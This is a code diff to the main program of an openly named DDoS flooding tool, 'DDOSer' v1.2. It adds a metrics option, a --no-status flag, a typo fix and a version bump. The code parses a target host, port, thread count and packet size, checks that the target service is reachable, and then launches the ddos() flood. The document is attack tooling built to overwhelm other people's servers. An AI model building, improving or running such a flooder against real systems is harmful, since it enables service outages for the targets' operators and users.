@@ -15,8 +15,6 @@
 #include <stdbool.h>
 #include <time.h>
 
-
-
 #include "ddos.h"
 #include "message.h"
 #include "socket.h"
@@ -34,13 +32,13 @@ int main(int argc, const char* argv[])
     printf("██║  ██║██║  ██║██║   ██║╚════██║██╔══╝  ██╔══██╗\n");
     printf("██████╔╝██████╔╝╚██████╔╝███████║███████╗██║  ██║\n");
     printf("╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝\n");
-    printf("                                             v1.1\n");
-    info("DDOSer v1.1 by Andrewerr(https://github.com/Andrewerr)");
+    printf("                                             v1.2-early-prealpha\n");
+    info("DDOSer v1.2 by Andrewerr(https://github.com/Andrewerr)");
 #ifdef DEBUG
     info("Starting in DEBUG mode");
 #endif
     if (argc < 3 || !strcmp(argv[1], "-h")) {
-        info("Usage:%s -[h] <HOST> <PORT> -[r] -t <THREAD COUNT> -s <PACKET SIZE> [--http --no-warnings --no-check --no-wait]", argv[0]);
+        info("Usage:%s -[h] <HOST> <PORT> -[r] -t <THREAD COUNT> -s <PACKET SIZE> [--http --no-warnings --no-check --no-wait --no-status]", argv[0]);
         return 0;
     }
     const char* _host = argv[1];
@@ -117,10 +115,20 @@ int main(int argc, const char* argv[])
         }
         PACKET_SIZE = strlen(packet);
     }
+    metrics=SIZE_MB;
+    if(checklarg("--metrics", argv, argc)){
+#ifdef DEBUG
+        info("Metrics_raw=%s",getlarg("--metrics", argv, argc));
+#endif
+        metrics=str2metrics(getlarg("--metrics", argv, argc));
+        if(metrics<0){
+            die("Bad metrics argument");
+        }
+    }
     hide_warnings = checklarg("--no-warnings", argv, argc);
     bool check = !checklarg("--no-check", argv, argc);
     socket_wait = !checklarg("--no-wait", argv, argc);
-    
+    //Checking whether host online
     if (check&&PROTOCOL==MODE_TCP) {//TODO:For next verison make normal check
         info("Checking service");
         int sc = dos_tcp_sock(host, port);
@@ -148,7 +156,7 @@ int main(int argc, const char* argv[])
         
     }
 #ifdef DEBUG
-    info("Congiguration:");
+    info("Configuration:");
     info("HIDE_WARNINGS=%d", hide_warnings);
     info("HIDE ERRORS=%d",hide_errors);
     info("RANDOM_PACKET=%d", RANDOM_PACKET);
@@ -157,6 +165,8 @@ int main(int argc, const char* argv[])
     info("MODE=%d", PROTOCOL);
     info("USE_HTTP=%d", USE_HTTP);
     info("STATUS=%d",status);
+    info("METRICS_TYPE=%d",metrics);
+    info("METRICS_STR=%s",metrics2str(metrics));
 #endif
 
     ddos(host, port, packet, THREAD_COUNT, PROTOCOL);
